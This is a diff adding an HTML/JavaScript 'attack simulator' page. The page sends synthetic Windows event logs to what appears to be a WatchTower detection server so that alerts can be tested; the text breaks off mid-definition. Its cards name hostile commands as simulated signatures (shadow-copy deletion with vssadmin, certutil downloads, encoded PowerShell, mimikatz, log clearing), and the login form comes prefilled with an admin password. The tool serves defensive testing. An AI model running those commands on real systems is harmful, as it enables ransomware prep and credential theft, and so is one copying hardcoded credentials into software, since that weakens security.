@@ -1,0 +1,897 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WatchTower — Attack Simulator</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+/* ── Reset & root ── */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#060a12;
+  --surface:#0b1120;
+  --surface2:#111d30;
+  --border:#1a2e4a;
+  --border2:#243d60;
+  --text:#ccd8f0;
+  --muted:#4a6080;
+  --accent:#00d4ff;
+  --accent2:#7c3aed;
+  --green:#00e676;
+  --yellow:#ffd600;
+  --orange:#ff6d00;
+  --red:#ff1744;
+  --critical-bg:rgba(255,23,68,.08);
+  --high-bg:rgba(255,109,0,.08);
+  --medium-bg:rgba(255,214,0,.08);
+  --low-bg:rgba(0,230,118,.08);
+}
+html,body{height:100%;background:var(--bg);color:var(--text);font-family:'Syne',sans-serif;overflow-x:hidden}
+/* ── Animated grid bg ── */
+body::before{
+  content:'';position:fixed;inset:0;z-index:0;pointer-events:none;
+  background-image:linear-gradient(rgba(0,212,255,.025) 1px,transparent 1px),linear-gradient(90deg,rgba(0,212,255,.025) 1px,transparent 1px);
+  background-size:48px 48px;
+  mask-image:radial-gradient(ellipse 80% 80% at 50% 0%,black 40%,transparent 100%);
+}
+
+/* ── Layout ── */
+.app{position:relative;z-index:1;min-height:100vh;display:grid;grid-template-rows:auto 1fr;max-width:1200px;margin:0 auto;padding:0 24px}
+
+/* ── Header ── */
+header{padding:28px 0 24px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;gap:16px}
+.brand{display:flex;align-items:center;gap:14px}
+.brand-icon{width:44px;height:44px;background:linear-gradient(135deg,var(--accent2),var(--accent));border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:1.2rem;flex-shrink:0;box-shadow:0 0 24px rgba(0,212,255,.3)}
+.brand-title{font-size:1.3rem;font-weight:800;letter-spacing:-.02em}
+.brand-title span{color:var(--accent)}
+.brand-sub{font-size:.72rem;color:var(--muted);margin-top:2px;font-family:'JetBrains Mono',monospace;letter-spacing:.08em}
+.status-bar{display:flex;align-items:center;gap:8px;font-family:'JetBrains Mono',monospace;font-size:.72rem}
+.status-dot{width:8px;height:8px;border-radius:50%;background:var(--muted);flex-shrink:0;transition:all .3s}
+.status-dot.ok{background:var(--green);box-shadow:0 0 8px var(--green);animation:pulse 2s infinite}
+.status-dot.err{background:var(--red);box-shadow:0 0 8px var(--red)}
+.status-dot.busy{background:var(--yellow);box-shadow:0 0 8px var(--yellow)}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
+.status-text{color:var(--muted)}
+.status-text.ok{color:var(--green)}
+.status-text.err{color:var(--red)}
+.status-text.busy{color:var(--yellow)}
+
+/* ── Main ── */
+main{padding:24px 0 48px;display:grid;grid-template-columns:340px 1fr;gap:24px;align-items:start}
+
+/* ── Panel ── */
+.panel{background:var(--surface);border:1px solid var(--border);border-radius:14px;overflow:hidden}
+.panel-header{padding:16px 20px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px}
+.panel-header h2{font-size:.8rem;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.1em}
+.panel-icon{font-size:1rem}
+.panel-body{padding:20px}
+
+/* ── Connect form ── */
+.field{margin-bottom:14px}
+.field label{display:block;font-family:'JetBrains Mono',monospace;font-size:.7rem;color:var(--muted);margin-bottom:6px;text-transform:uppercase;letter-spacing:.07em}
+.field input{width:100%;background:var(--surface2);border:1px solid var(--border);border-radius:8px;color:var(--text);padding:9px 12px;font-size:.85rem;font-family:'JetBrains Mono',monospace;transition:border-color .15s}
+.field input:focus{outline:none;border-color:var(--accent);box-shadow:0 0 0 2px rgba(0,212,255,.1)}
+.field input::placeholder{color:var(--muted)}
+
+/* ── Buttons ── */
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;border:none;border-radius:9px;cursor:pointer;font-family:'Syne',sans-serif;font-weight:700;letter-spacing:.02em;transition:all .15s;white-space:nowrap}
+.btn-primary{background:linear-gradient(135deg,var(--accent2),var(--accent));color:#fff;padding:10px 20px;font-size:.85rem;width:100%}
+.btn-primary:hover{filter:brightness(1.15);transform:translateY(-1px);box-shadow:0 4px 20px rgba(0,212,255,.3)}
+.btn-primary:active{transform:none}
+.btn-primary:disabled{opacity:.4;cursor:not-allowed;transform:none;filter:none;box-shadow:none}
+
+/* ── Token display ── */
+.token-display{background:var(--surface2);border:1px solid var(--border);border-radius:8px;padding:10px 12px;font-family:'JetBrains Mono',monospace;font-size:.7rem;color:var(--green);word-break:break-all;margin-top:10px;display:none}
+.agent-display{background:var(--surface2);border:1px solid rgba(0,212,255,.2);border-radius:8px;padding:10px 12px;margin-top:10px;display:none}
+.agent-display .agent-name{font-family:'JetBrains Mono',monospace;font-size:.8rem;font-weight:600;color:var(--accent)}
+.agent-display .agent-key{font-family:'JetBrains Mono',monospace;font-size:.65rem;color:var(--muted);word-break:break-all;margin-top:4px}
+
+/* ── Right panel ── */
+.right{display:flex;flex-direction:column;gap:20px}
+
+/* ── Attack grid ── */
+.attack-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.attack-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:16px;cursor:pointer;transition:all .2s;position:relative;overflow:hidden}
+.attack-card::before{content:'';position:absolute;inset:0;opacity:0;transition:opacity .2s;border-radius:inherit}
+.attack-card:hover{transform:translateY(-2px);border-color:var(--border2)}
+.attack-card:hover::before{opacity:1}
+.attack-card:active{transform:none}
+.attack-card.firing{animation:fire .6s ease}
+@keyframes fire{0%{transform:scale(1)}50%{transform:scale(.97)}100%{transform:scale(1)}}
+
+/* Severity color coding */
+.attack-card.critical{border-color:rgba(255,23,68,.3)}
+.attack-card.critical::before{background:var(--critical-bg)}
+.attack-card.critical:hover{border-color:var(--red);box-shadow:0 0 20px rgba(255,23,68,.15)}
+.attack-card.high{border-color:rgba(255,109,0,.3)}
+.attack-card.high::before{background:var(--high-bg)}
+.attack-card.high:hover{border-color:var(--orange);box-shadow:0 0 20px rgba(255,109,0,.15)}
+.attack-card.medium{border-color:rgba(255,214,0,.25)}
+.attack-card.medium::before{background:var(--medium-bg)}
+.attack-card.medium:hover{border-color:var(--yellow);box-shadow:0 0 20px rgba(255,214,0,.12)}
+.attack-card.low{border-color:rgba(0,230,118,.25)}
+.attack-card.low::before{background:var(--low-bg)}
+.attack-card.low:hover{border-color:var(--green);box-shadow:0 0 20px rgba(0,230,118,.12)}
+
+.card-top{display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:10px;position:relative;z-index:1}
+.card-icon{font-size:1.6rem;line-height:1}
+.sev-pill{font-size:.6rem;font-weight:700;padding:2px 8px;border-radius:4px;text-transform:uppercase;letter-spacing:.07em;font-family:'JetBrains Mono',monospace}
+.sev-pill.critical{background:rgba(255,23,68,.15);color:var(--red);border:1px solid rgba(255,23,68,.3)}
+.sev-pill.high{background:rgba(255,109,0,.12);color:var(--orange);border:1px solid rgba(255,109,0,.25)}
+.sev-pill.medium{background:rgba(255,214,0,.1);color:var(--yellow);border:1px solid rgba(255,214,0,.2)}
+.sev-pill.low{background:rgba(0,230,118,.1);color:var(--green);border:1px solid rgba(0,230,118,.2)}
+
+.card-title{font-size:.85rem;font-weight:700;color:#fff;margin-bottom:4px;position:relative;z-index:1;line-height:1.3}
+.card-desc{font-size:.72rem;color:var(--muted);line-height:1.5;position:relative;z-index:1}
+.card-events{font-family:'JetBrains Mono',monospace;font-size:.65rem;color:var(--border2);margin-top:8px;position:relative;z-index:1}
+
+.card-spinner{display:none;position:absolute;top:12px;right:12px;width:16px;height:16px;border:2px solid var(--border2);border-top-color:var(--accent);border-radius:50%;animation:spin .6s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.attack-card.loading .card-spinner{display:block}
+.attack-card.loading{pointer-events:none;opacity:.7}
+
+.card-result{display:none;position:absolute;inset:0;background:rgba(0,18,32,.92);border-radius:inherit;align-items:center;justify-content:center;flex-direction:column;gap:8px;z-index:10;backdrop-filter:blur(4px)}
+.card-result.show{display:flex}
+.result-icon{font-size:2rem}
+.result-msg{font-size:.78rem;font-weight:600;text-align:center;padding:0 12px}
+.result-msg.ok{color:var(--green)}
+.result-msg.err{color:var(--red)}
+
+/* ── Big scenario button ── */
+.scenario-btn{background:linear-gradient(135deg,rgba(124,58,237,.15),rgba(0,212,255,.1));border:1px solid rgba(124,58,237,.35);border-radius:12px;padding:20px;cursor:pointer;transition:all .2s;width:100%;text-align:left;display:flex;align-items:center;gap:16px}
+.scenario-btn:hover{border-color:rgba(124,58,237,.6);box-shadow:0 0 30px rgba(124,58,237,.15);transform:translateY(-1px)}
+.scenario-btn:active{transform:none}
+.scenario-btn:disabled{opacity:.4;cursor:not-allowed;transform:none;box-shadow:none}
+.scenario-icon{font-size:2.4rem;flex-shrink:0}
+.scenario-text{}
+.scenario-title{font-size:1rem;font-weight:800;color:#fff;margin-bottom:4px}
+.scenario-desc{font-size:.75rem;color:var(--muted);line-height:1.5}
+.scenario-tags{display:flex;gap:6px;margin-top:8px;flex-wrap:wrap}
+.tag{font-size:.62rem;font-family:'JetBrains Mono',monospace;padding:2px 8px;border-radius:4px;border:1px solid var(--border2);color:var(--muted)}
+
+/* ── Activity log ── */
+.log-list{max-height:280px;overflow-y:auto;display:flex;flex-direction:column;gap:6px}
+.log-list::-webkit-scrollbar{width:3px}
+.log-list::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
+.log-entry{display:flex;align-items:flex-start;gap:10px;padding:10px 12px;background:var(--surface2);border-radius:8px;border:1px solid var(--border);font-size:.75rem;animation:slideIn .25s ease}
+@keyframes slideIn{from{opacity:0;transform:translateX(-8px)}to{opacity:1;transform:none}}
+.log-entry.ok{border-color:rgba(0,230,118,.2)}
+.log-entry.err{border-color:rgba(255,23,68,.2)}
+.log-entry.info{border-color:rgba(0,212,255,.2)}
+.log-time{font-family:'JetBrains Mono',monospace;color:var(--muted);flex-shrink:0;font-size:.65rem;margin-top:1px}
+.log-icon{flex-shrink:0;font-size:1rem;margin-top:-1px}
+.log-text{flex:1;line-height:1.4}
+.log-text strong{font-weight:700}
+.log-text .ev-count{font-family:'JetBrains Mono',monospace;background:rgba(0,212,255,.1);color:var(--accent);padding:1px 6px;border-radius:4px;font-size:.65rem;margin-left:4px}
+.log-empty{text-align:center;color:var(--muted);font-size:.78rem;padding:32px 0}
+
+/* ── Progress bar for scenario ── */
+.progress-wrap{display:none;margin-top:12px}
+.progress-label{font-family:'JetBrains Mono',monospace;font-size:.68rem;color:var(--muted);margin-bottom:6px;display:flex;justify-content:space-between}
+.progress-track{height:4px;background:var(--border);border-radius:2px;overflow:hidden}
+.progress-fill{height:100%;background:linear-gradient(90deg,var(--accent2),var(--accent));border-radius:2px;width:0%;transition:width .4s ease}
+
+/* ── Quick actions ── */
+.quick-row{display:flex;gap:8px}
+.btn-sm{padding:7px 14px;font-size:.75rem;border-radius:7px;border:1px solid var(--border2);background:var(--surface2);color:var(--muted);cursor:pointer;font-family:'Syne',sans-serif;font-weight:600;transition:all .15s;flex:1}
+.btn-sm:hover{border-color:var(--accent);color:var(--accent);background:rgba(0,212,255,.06)}
+.btn-sm.danger:hover{border-color:var(--red);color:var(--red);background:rgba(255,23,68,.06)}
+
+/* ── Disabled overlay ── */
+.disabled-overlay{position:absolute;inset:0;background:rgba(6,10,18,.7);z-index:20;display:flex;align-items:center;justify-content:center;border-radius:inherit;backdrop-filter:blur(2px)}
+.disabled-overlay p{font-size:.82rem;color:var(--muted);text-align:center;max-width:180px;line-height:1.5}
+.panel,.attack-grid,.scenario-btn{position:relative}
+
+/* ── Dashboard link ── */
+.dash-link{display:inline-flex;align-items:center;gap:6px;font-size:.75rem;color:var(--accent);font-family:'JetBrains Mono',monospace;border:1px solid rgba(0,212,255,.25);padding:5px 12px;border-radius:6px;transition:all .15s;text-decoration:none}
+.dash-link:hover{background:rgba(0,212,255,.08);border-color:rgba(0,212,255,.5)}
+
+@media(max-width:900px){
+  main{grid-template-columns:1fr}
+  .attack-grid{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<div class="app">
+
+<!-- ── HEADER ── -->
+<header>
+  <div class="brand">
+    <div class="brand-icon">🗼</div>
+    <div>
+      <div class="brand-title">Watch<span>Tower</span> Attack Simulator</div>
+      <div class="brand-sub">LOCAL TESTING TOOL · NO JSON REQUIRED</div>
+    </div>
+  </div>
+  <div style="display:flex;align-items:center;gap:14px">
+    <div class="status-bar">
+      <div class="status-dot" id="statusDot"></div>
+      <span class="status-text" id="statusText">Not connected</span>
+    </div>
+    <a class="dash-link" href="http://localhost:5000/dashboard/incidents" target="_blank">
+      🔗 Open Dashboard
+    </a>
+  </div>
+</header>
+
+<!-- ── MAIN ── -->
+<main>
+
+  <!-- LEFT: Connect panel -->
+  <div style="display:flex;flex-direction:column;gap:16px">
+
+    <!-- Connection -->
+    <div class="panel">
+      <div class="panel-header">
+        <span class="panel-icon">🔌</span>
+        <h2>1 · Connect to WatchTower</h2>
+      </div>
+      <div class="panel-body">
+        <div class="field">
+          <label>WatchTower URL <span style="color:var(--green);font-size:.65rem">(leave blank = auto)</span></label>
+          <input type="text" id="wtUrl" value="" placeholder="Auto (uses current server)">
+        </div>
+        <div class="field">
+          <label>Admin Username</label>
+          <input type="text" id="wtUser" value="admin" placeholder="admin">
+        </div>
+        <div class="field">
+          <label>Admin Password</label>
+          <input type="password" id="wtPass" value="Admin@WatchTower1!" placeholder="••••••••••••">
+        </div>
+        <button class="btn btn-primary" id="connectBtn" onclick="connect()">
+          <span id="connectBtnText">⚡ Connect &amp; Setup</span>
+        </button>
+        <div class="token-display" id="tokenDisplay"></div>
+        <div class="agent-display" id="agentDisplay">
+          <div class="agent-name" id="agentName"></div>
+          <div class="agent-key" id="agentKeyDisplay"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Activity log -->
+    <div class="panel">
+      <div class="panel-header">
+        <span class="panel-icon">📋</span>
+        <h2>Activity Log</h2>
+      </div>
+      <div class="panel-body" style="padding:12px 16px">
+        <div class="log-list" id="logList">
+          <div class="log-empty">Connect to WatchTower to start testing</div>
+        </div>
+        <div class="quick-row" style="margin-top:10px">
+          <button class="btn-sm" onclick="clearLog()">Clear Log</button>
+          <button class="btn-sm" onclick="openDashboard()">View Incidents →</button>
+          <button class="btn-sm danger" onclick="resetData()">Reset Test Data</button>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- RIGHT: Attack cards -->
+  <div class="right">
+
+    <!-- Full scenario button -->
+    <button class="scenario-btn" id="scenarioBtn" onclick="runFullScenario()" disabled>
+      <div class="scenario-icon">🎭</div>
+      <div class="scenario-text">
+        <div class="scenario-title">Run Full Attack Chain (5 Steps)</div>
+        <div class="scenario-desc">Simulates a complete real-world attack: brute force login → successful access → credential dumping → ransomware prep → log clearing. Generates 5+ incidents automatically.</div>
+        <div class="scenario-tags">
+          <span class="tag">Brute Force</span>
+          <span class="tag">Mimikatz</span>
+          <span class="tag">Shadow Copy</span>
+          <span class="tag">Log Cleared</span>
+          <span class="tag">5 CRITICAL Incidents</span>
+        </div>
+      </div>
+      <div class="progress-wrap" id="scenarioProgress">
+        <div class="progress-label"><span id="progressLabel">Running…</span><span id="progressPct">0%</span></div>
+        <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
+      </div>
+    </button>
+
+    <!-- Individual attack cards -->
+    <div class="panel">
+      <div class="panel-header">
+        <span class="panel-icon">🎯</span>
+        <h2>2 · Click a Button to Fire a Single Attack</h2>
+      </div>
+      <div class="panel-body">
+        <div class="attack-grid" id="attackGrid">
+          <div id="gridOverlay" class="disabled-overlay"><p>Connect to WatchTower first</p></div>
+
+          <!-- Card 1 -->
+          <div class="attack-card critical" onclick="fireAttack('bruteforce')">
+            <div class="card-top">
+              <div class="card-icon">🔨</div>
+              <div class="sev-pill critical">CRITICAL</div>
+            </div>
+            <div class="card-title">Brute Force Login</div>
+            <div class="card-desc">Sends 12 failed logon attempts from the same source in rapid succession.</div>
+            <div class="card-events">EVENT 4625 × 12</div>
+            <div class="card-spinner"></div>
+            <div class="card-result"><div class="result-icon"></div><div class="result-msg"></div></div>
+          </div>
+
+          <!-- Card 2 -->
+          <div class="attack-card critical" onclick="fireAttack('mimikatz')">
+            <div class="card-top">
+              <div class="card-icon">🔑</div>
+              <div class="sev-pill critical">CRITICAL</div>
+            </div>
+            <div class="card-title">Mimikatz Credential Dump</div>
+            <div class="card-desc">Simulates the credential dumping tool being launched on the endpoint.</div>
+            <div class="card-events">EVENT 4688 (process: mimikatz.exe)</div>
+            <div class="card-spinner"></div>
+            <div class="card-result"><div class="result-icon"></div><div class="result-msg"></div></div>
+          </div>
+
+          <!-- Card 3 -->
+          <div class="attack-card critical" onclick="fireAttack('shadowcopy')">
+            <div class="card-top">
+              <div class="card-icon">💀</div>
+              <div class="sev-pill critical">CRITICAL</div>
+            </div>
+            <div class="card-title">Shadow Copy Deletion</div>
+            <div class="card-desc">Ransomware prep — vssadmin deletes all volume shadow copies before encryption.</div>
+            <div class="card-events">EVENT 4688 (vssadmin delete shadows)</div>
+            <div class="card-spinner"></div>
+            <div class="card-result"><div class="result-icon"></div><div class="result-msg"></div></div>
+          </div>
+
+          <!-- Card 4 -->
+          <div class="attack-card critical" onclick="fireAttack('logcleared')">
+            <div class="card-top">
+              <div class="card-icon">🗑️</div>
+              <div class="sev-pill critical">CRITICAL</div>
+            </div>
+            <div class="card-title">Security Log Cleared</div>
+            <div class="card-desc">Attacker wipes the Windows Security event log to cover their tracks.</div>
+            <div class="card-events">EVENT 1102</div>
+            <div class="card-spinner"></div>
+            <div class="card-result"><div class="result-icon"></div><div class="result-msg"></div></div>
+          </div>
+
+          <!-- Card 5 -->
+          <div class="attack-card high" onclick="fireAttack('powershell')">
+            <div class="card-top">
+              <div class="card-icon">💻</div>
+              <div class="sev-pill high">HIGH</div>
+            </div>
+            <div class="card-title">PowerShell Encoded Command</div>
+            <div class="card-desc">PowerShell launched with a base64-encoded payload — typical obfuscation technique.</div>
+            <div class="card-events">EVENT 4688 (powershell -enc …)</div>
+            <div class="card-spinner"></div>
+            <div class="card-result"><div class="result-icon"></div><div class="result-msg"></div></div>
+          </div>
+
+          <!-- Card 6 -->
+          <div class="attack-card high" onclick="fireAttack('psexec')">
+            <div class="card-top">
+              <div class="card-icon">🌐</div>
+              <div class="sev-pill high">HIGH</div>
+            </div>
+            <div class="card-title">PsExec Lateral Movement</div>
+            <div class="card-desc">PsExec service installed on remote machine — classic lateral movement indicator.</div>
+            <div class="card-events">EVENT 7045 (PSEXESVC)</div>
+            <div class="card-spinner"></div>
+            <div class="card-result"><div class="result-icon"></div><div class="result-msg"></div></div>
+          </div>
+
+          <!-- Card 7 -->
+          <div class="attack-card high" onclick="fireAttack('newservice')">
+            <div class="card-top">
+              <div class="card-icon">⚙️</div>
+              <div class="sev-pill high">HIGH</div>
+            </div>
+            <div class="card-title">Malicious Service Installed</div>
+            <div class="card-desc">A new Windows service is installed — common persistence and privilege escalation method.</div>
+            <div class="card-events">EVENT 7045</div>
+            <div class="card-spinner"></div>
+            <div class="card-result"><div class="result-icon"></div><div class="result-msg"></div></div>
+          </div>
+
+          <!-- Card 8 -->
+          <div class="attack-card high" onclick="fireAttack('addedtoadmins')">
+            <div class="card-top">
+              <div class="card-icon">👑</div>
+              <div class="sev-pill high">HIGH</div>
+            </div>
+            <div class="card-title">User Added to Admins</div>
+            <div class="card-desc">A regular user is added to the Administrators group — privilege escalation alert.</div>
+            <div class="card-events">EVENT 4732</div>
+            <div class="card-spinner"></div>
+            <div class="card-result"><div class="result-icon"></div><div class="result-msg"></div></div>
+          </div>
+
+          <!-- Card 9 -->
+          <div class="attack-card high" onclick="fireAttack('scheduledtask')">
+            <div class="card-top">
+              <div class="card-icon">⏰</div>
+              <div class="sev-pill high">HIGH</div>
+            </div>
+            <div class="card-title">Scheduled Task Created</div>
+            <div class="card-desc">A new scheduled task is created — frequently used by malware for persistence.</div>
+            <div class="card-events">EVENT 4698</div>
+            <div class="card-spinner"></div>
+            <div class="card-result"><div class="result-icon"></div><div class="result-msg"></div></div>
+          </div>
+
+          <!-- Card 10 -->
+          <div class="attack-card high" onclick="fireAttack('rdp')">
+            <div class="card-top">
+              <div class="card-icon">🖥️</div>
+              <div class="sev-pill high">HIGH</div>
+            </div>
+            <div class="card-title">RDP Remote Logon</div>
+            <div class="card-desc">Remote Desktop connection logged — monitor for unexpected remote access events.</div>
+            <div class="card-events">EVENT 4624 (logon type 10)</div>
+            <div class="card-spinner"></div>
+            <div class="card-result"><div class="result-icon"></div><div class="result-msg"></div></div>
+          </div>
+
+          <!-- Card 11 -->
+          <div class="attack-card medium" onclick="fireAttack('accountlockout')">
+            <div class="card-top">
+              <div class="card-icon">🔒</div>
+              <div class="sev-pill medium">MEDIUM</div>
+            </div>
+            <div class="card-title">Account Lockout</div>
+            <div class="card-desc">User account is locked out after too many failed password attempts.</div>
+            <div class="card-events">EVENT 4740</div>
+            <div class="card-spinner"></div>
+            <div class="card-result"><div class="result-icon"></div><div class="result-msg"></div></div>
+          </div>
+
+          <!-- Card 12 -->
+          <div class="attack-card medium" onclick="fireAttack('newuser')">
+            <div class="card-top">
+              <div class="card-icon">👤</div>
+              <div class="sev-pill medium">MEDIUM</div>
+            </div>
+            <div class="card-title">New User Created</div>
+            <div class="card-desc">A new local user account is created — verify this is authorized activity.</div>
+            <div class="card-events">EVENT 4720</div>
+            <div class="card-spinner"></div>
+            <div class="card-result"><div class="result-icon"></div><div class="result-msg"></div></div>
+          </div>
+
+          <!-- Card 13 -->
+          <div class="attack-card medium" onclick="fireAttack('certutil')">
+            <div class="card-top">
+              <div class="card-icon">📦</div>
+              <div class="sev-pill medium">MEDIUM</div>
+            </div>
+            <div class="card-title">Certutil File Download</div>
+            <div class="card-desc">certutil.exe used to download or decode a file — common malware dropper technique.</div>
+            <div class="card-events">EVENT 4688 (certutil -urlcache)</div>
+            <div class="card-spinner"></div>
+            <div class="card-result"><div class="result-icon"></div><div class="result-msg"></div></div>
+          </div>
+
+          <!-- Card 14 -->
+          <div class="attack-card low" onclick="fireAttack('whoami')">
+            <div class="card-top">
+              <div class="card-icon">🔍</div>
+              <div class="sev-pill low">LOW</div>
+            </div>
+            <div class="card-title">Post-Exploitation Recon</div>
+            <div class="card-desc">whoami.exe executed — attacker checking their current user context after gaining access.</div>
+            <div class="card-events">EVENT 4688 (whoami.exe)</div>
+            <div class="card-spinner"></div>
+            <div class="card-result"><div class="result-icon"></div><div class="result-msg"></div></div>
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+  </div><!-- /right -->
+</main>
+</div><!-- /app -->
+
+<script>
+// ── State ──────────────────────────────────────────────────────────────────
+let WT_URL = '', JWT_TOKEN = '', AGENT_KEY = '', AGENT_ID = '';
+const connected = () => !!JWT_TOKEN && !!AGENT_KEY;
+
+// ── HMAC-SHA256 via Web Crypto ─────────────────────────────────────────────
+async function hmacSha256(key, message) {
+  const enc = new TextEncoder();
+  const k = await crypto.subtle.importKey('raw', enc.encode(key), {name:'HMAC',hash:'SHA-256'}, false, ['sign']);
+  const sig = await crypto.subtle.sign('HMAC', k, enc.encode(message));
+  return Array.from(new Uint8Array(sig)).map(b=>b.toString(16).padStart(2,'0')).join('');
+}
+
+// ── Log helpers ────────────────────────────────────────────────────────────
+function addLog(type, icon, html) {
+  const list = document.getElementById('logList');
+  const empty = list.querySelector('.log-empty');
+  if (empty) empty.remove();
+  const now = new Date().toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit',second:'2-digit'});
+  const el = document.createElement('div');
+  el.className = `log-entry ${type}`;
+  el.innerHTML = `<span class="log-time">${now}</span><span class="log-icon">${icon}</span><div class="log-text">${html}</div>`;
+  list.prepend(el);
+  // Keep max 30 entries
+  while(list.children.length > 30) list.lastChild.remove();
+}
+function clearLog() {
+  document.getElementById('logList').innerHTML = '<div class="log-empty">Log cleared</div>';
+}
+
+// ── Status indicator ───────────────────────────────────────────────────────
+function setStatus(state, text) {
+  const dot = document.getElementById('statusDot'), txt = document.getElementById('statusText');
+  dot.className = 'status-dot ' + state;
+  txt.className = 'status-text ' + state;
+  txt.textContent = text;
+}
+
+// ── Connect & Setup ────────────────────────────────────────────────────────
+async function connect() {
+  const btn = document.getElementById('connectBtn');
+  const btnText = document.getElementById('connectBtnText');
+  WT_URL = document.getElementById('wtUrl').value.trim().replace(/\/$/,'');
+  const user = document.getElementById('wtUser').value.trim();
+  const pass = document.getElementById('wtPass').value;
+
+  btn.disabled = true;
+  btnText.textContent = '🔄 Connecting…';
+  setStatus('busy', 'Connecting…');
+
+  // Step 1 — Login
+  try {
+    addLog('info','🔌',`Connecting to <strong>${WT_URL}</strong>…`);
+    const r = await fetch(`${WT_URL}/api/v1/auth/login`,{
+      method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({username:user,password:pass})
+    });
+    const d = await r.json();
+    if (!r.ok) throw new Error(d.error || d.message || `HTTP ${r.status}`);
+    JWT_TOKEN = d.access_token;
+    document.getElementById('tokenDisplay').style.display = 'block';
+    document.getElementById('tokenDisplay').textContent = '✓ JWT token acquired: ' + JWT_TOKEN.substring(0,28) + '…';
+    addLog('ok','✅',`Logged in as <strong>${d.user?.username}</strong> (${d.user?.role})`);
+  } catch(e) {
+    addLog('err','❌',`Login failed: <strong>${e.message}</strong>. Check URL and credentials.`);
+    setStatus('err','Connection failed');
+    btn.disabled = false; btnText.textContent = '⚡ Connect & Setup'; return;
+  }
+
+  // Step 2 — Seed rules
+  btnText.textContent = '🌱 Seeding rules…';
+  try {
+    const r = await fetch(`${WT_URL}/api/v1/rules/seed`,{
+      method:'POST',headers:{Authorization:`Bearer ${JWT_TOKEN}`}
+    });
+    const d = await r.json();
+    addLog('ok','🛡️',`Detection rules ready: <strong>${d.message||'Rules seeded'}</strong>`);
+  } catch(e) {
+    addLog('info','ℹ️','Rules seed skipped (rules may already exist)');
+  }
+
+  // Step 3 — Register test agent
+  btnText.textContent = '🤖 Registering agent…';
+  try {
+    const r = await fetch(`${WT_URL}/api/v1/agents/register`,{
+      method:'POST',
+      headers:{Authorization:`Bearer ${JWT_TOKEN}`,'Content-Type':'application/json'},
+      body:JSON.stringify({hostname:'SIMULATOR-01',ip_address:'192.168.1.200',os_version:'Windows 11 Pro 23H2',sysmon_installed:true})
+    });
+    const d = await r.json();
+    if (!r.ok && r.status !== 409) throw new Error(d.error || `HTTP ${r.status}`);
+    if (r.ok && d.api_key) {
+      AGENT_KEY = d.api_key;
+      AGENT_ID = d.agent_id || '';
+      document.getElementById('agentDisplay').style.display = 'block';
+      document.getElementById('agentName').textContent = '✓ Agent: SIMULATOR-01 registered';
+      document.getElementById('agentKeyDisplay').textContent = 'Key: ' + AGENT_KEY.substring(0,20) + '…';
+      addLog('ok','🖥️',`Test agent <strong>SIMULATOR-01</strong> registered successfully`);
+    } else {
+      // Agent already exists — fetch existing key by registering again (it will fail with conflict)
+      // We need to try a different approach: register with timestamp to get a fresh key
+      const r2 = await fetch(`${WT_URL}/api/v1/agents/register`,{
+        method:'POST',
+        headers:{Authorization:`Bearer ${JWT_TOKEN}`,'Content-Type':'application/json'},
+        body:JSON.stringify({hostname:'SIMULATOR-'+ Date.now().toString().slice(-4),ip_address:'192.168.1.200',os_version:'Windows 11 Pro 23H2',sysmon_installed:true})
+      });
+      const d2 = await r2.json();
+      if (r2.ok && d2.api_key) {
+        AGENT_KEY = d2.api_key;
+        document.getElementById('agentDisplay').style.display='block';
+        document.getElementById('agentName').textContent = '✓ Agent: ' + (d2.agent?.hostname || 'SIMULATOR') + ' registered';
+        document.getElementById('agentKeyDisplay').textContent = 'Key: ' + AGENT_KEY.substring(0,20) + '…';
+        addLog('ok','🖥️',`Test agent registered successfully`);
+      } else {
+        throw new Error('Could not register agent');
+      }
+    }
+  } catch(e) {
+    addLog('err','❌',`Agent registration failed: <strong>${e.message}</strong>`);
+    setStatus('err','Partial setup'); btn.disabled=false; btnText.textContent='⚡ Retry Setup'; return;
+  }
+
+  // Done!
+  setStatus('ok','Connected & Ready');
+  btnText.textContent = '✓ Connected — Click attacks below!';
+  document.getElementById('gridOverlay').remove();
+  document.getElementById('scenarioBtn').disabled = false;
+  addLog('ok','🚀','<strong>All set! Click any attack button to fire test events.</strong>');
+}
+
+// ── Send events helper ─────────────────────────────────────────────────────
+async function sendEvents(events) {
+  const body = JSON.stringify(Array.isArray(events) ? events : [events]);
+  const sig = await hmacSha256(AGENT_KEY, body);
+  const r = await fetch(`${WT_URL}/api/v1/ingest`,{
+    method:'POST',
+    headers:{'Content-Type':'application/json','X-WatchTower-Key':AGENT_KEY,'X-WatchTower-Signature':sig},
+    body
+  });
+  if (!r.ok) throw new Error(`HTTP ${r.status}`);
+  return r.json();
+}
+
+function ts(offsetSeconds=0) {
+  return new Date(Date.now() - offsetSeconds*1000).toISOString();
+}
+
+// ── Attack definitions ─────────────────────────────────────────────────────
+const ATTACKS = {
+  bruteforce: {
+    label:'Brute Force Login',
+    build: () => Array.from({length:12},(_,i)=>({
+      event_id:4625, channel:'Security', timestamp:ts(i),
+      computer:'SIMULATOR-01', provider:'Microsoft-Windows-Security-Auditing',
+      message:'An account failed to log on.',
+      data:{SubjectUserName:'attacker',TargetUserName:'administrator',LogonType:'3',IpAddress:'10.0.0.99'}
+    }))
+  },
+  mimikatz: {
